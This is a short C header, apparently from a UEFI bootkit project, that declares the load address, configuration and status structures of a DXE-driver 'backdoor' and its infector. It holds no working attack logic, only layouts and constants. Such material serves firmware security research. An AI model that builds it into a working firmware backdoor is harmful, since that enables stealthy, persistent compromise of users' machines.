
#ifndef _BOOT_BACKDOOR_H_
#define _BOOT_BACKDOOR_H_

#pragma warning(disable: 4200)

// physical address where DXE driver will be loaded
#define BACKDOOR_ADDR 0x10000

#pragma pack(1)

typedef struct _INFECTOR_CONFIG
{
    UINT64 BackdoorEntryInfected;
    UINT64 LocateProtocol;
    UINT64 SystemTable;

} INFECTOR_CONFIG,
*PINFECTOR_CONFIG;

#pragma pack()

#pragma pack(1)

typedef struct _INFECTOR_STATUS
{
    UINT64 Success;
    UINT64 Unused;

} INFECTOR_STATUS,
*PINFECTOR_STATUS;

#pragma pack()

// physical address of INFECTOR_STATUS
#define STATUS_ADDR (0x1000 - sizeof(INFECTOR_STATUS))

#define MAX_IMAGE_SIZE (1 * 1024 * 1024)

void ConsolePrint(char *Message);

#endif
